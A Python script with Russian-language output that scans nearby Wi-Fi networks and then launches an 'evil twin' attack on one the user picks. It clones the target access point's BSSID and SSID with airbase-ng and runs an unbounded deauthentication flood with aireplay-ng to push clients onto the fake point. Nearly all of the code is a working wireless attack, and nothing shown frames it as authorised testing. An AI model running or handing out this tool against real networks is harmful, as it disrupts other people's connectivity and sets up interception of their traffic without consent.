import os
import sys
import time
import signal
import subprocess
import tempfile
import csv
from collections import defaultdict
from pathlib import Path

interface = "wlan0mon"
procs = []  

def cleanup(signum=None, frame=None):
    print(f"Завершение работы")
    for proc in procs:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except (ProcessLookupError, AttributeError):
            pass
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def scan_networks(interface, duration=10):
    prefix = tempfile.mktemp(prefix="scan_")
    cmd = [
        "airodump-ng",
        "--band", "abg",
        "--output-format", "csv",
        "-w", prefix,
        interface
    ]
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            preexec_fn=os.setsid)
    procs.append(proc)
    time.sleep(duration)
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except ProcessLookupError:
        pass  
    proc.wait()
    procs.remove(proc)

    csv_file = prefix + "-01.csv"
    if not os.path.exists(csv_file):
        return []

    networks = []
    clients_count = defaultdict(int)

    with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
        reader = csv.reader(f)
        found_ap = False
        for row in reader:
            if not found_ap:
                if row and row[0].strip() == "BSSID":
                    found_ap = True
                continue
            if len(row) < 14:
                continue
            bssid = row[0].strip()
            if not bssid or len(bssid) != 17:
                continue
            if bssid == "BSSID":  
                break
            try:
                ssid = row[13].strip()
                if ssid == "" or ssid == "(not associated)":
                    ssid = "Hidden"
                channel = int(row[3].strip())
                encryption = row[5].strip()
                networks.append({
                    "bssid": bssid,
                    "ssid": ssid,
                    "channel": channel,
                    "encryption": encryption,
                    "clients": 0
                })
            except (ValueError, IndexError):
                continue

    with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
        lines = f.readlines()
    station_idx = None
    for i, line in enumerate(lines):
        if "Station MAC" in line:
            station_idx = i
            break
    if station_idx:
        for line in lines[station_idx+1:]:
            parts = line.strip().split(',')
            if len(parts) > 5:
                client = parts[0].strip()
                if len(client) == 17:  
                    bssid_associated = parts[5].strip()
                    if bssid_associated:
                        clients_count[bssid_associated] += 1

    for net in networks:
        net["clients"] = clients_count.get(net["bssid"], 0)

    for f in Path(prefix).parent.glob(Path(prefix).name + "*"):
        try:
            f.unlink()
        except OSError:
            pass

    return networks

def start_evil_twin(mon_iface, target_bssid, target_ssid, target_channel):
    subprocess.run(["iwconfig", mon_iface, "channel", str(target_channel)])
    airbase_proc = subprocess.Popen(
        [
            "airbase-ng",
            "-a", target_bssid,
            "--essid", target_ssid,
            "-c", str(target_channel),
            mon_iface
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        preexec_fn=os.setsid
    )
    procs.append(airbase_proc)
    time.sleep(2)
    deauth_proc = subprocess.Popen(
        [
            "aireplay-ng",
            "--deauth", "0",          
            "-a", target_bssid,
            mon_iface
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid
    )
    procs.append(deauth_proc)

    print(f"Запущена поддельная точка '{target_ssid}' ({target_bssid}) на канале {target_channel}")
    print(f"Ожидание подключения клиента (для выхода нажмите Ctrl+C)")

    associated = False
    try:
        for line in airbase_proc.stdout:
            print("[airbase]", line.strip())
            if "associated" in line.lower():
                associated = True
                break
    except Exception as e:
        print(f"Ошибка при чтении вывода airbase-ng: {e}")

    if associated:
        print(f"Клиент подключился к поддельной точке доступа!")
        
    else:
        print(f"Клиент не подключился (процесс завершён).")

def main():
    print(f"Сканирование сетей (10 секунд).")
    networks = scan_networks(interface, duration=10)

    if not networks:
        print(f"Не найдено ни одной точки доступа.")
        sys.exit(1)

    print(f"Доступные точки доступа:")
    for idx, net in enumerate(networks, 1):
        print(f"{idx}. SSID: {net['ssid']:<20} | BSSID: {net['bssid']} | Канал: {net['channel']:2} | "
              f"Шифр: {net['encryption']:<12} | Клиентов: {net['clients']}")

    choice = input(f"Выберите номер точки доступа или введите BSSID: ").strip()
    target = None
    if choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(networks):
            target = networks[idx]
    else:
        for net in networks:
            if net['bssid'].upper() == choice.upper():
                target = net
                break

    if not target:
        print(f"Неверный выбор.")
        sys.exit(1)
    print(f"Выбрана точка доступа:")
    print(f"    SSID: {target['ssid']}")
    print(f"    BSSID: {target['bssid']}")
    print(f"    Канал: {target['channel']}")
    print(f"    Шифрование: {target['encryption']}")
    print(f"    Клиентов: {target['clients']}")
    start_evil_twin(interface, target['bssid'], target['ssid'], target['channel'])

if __name__ == "__main__":
    main()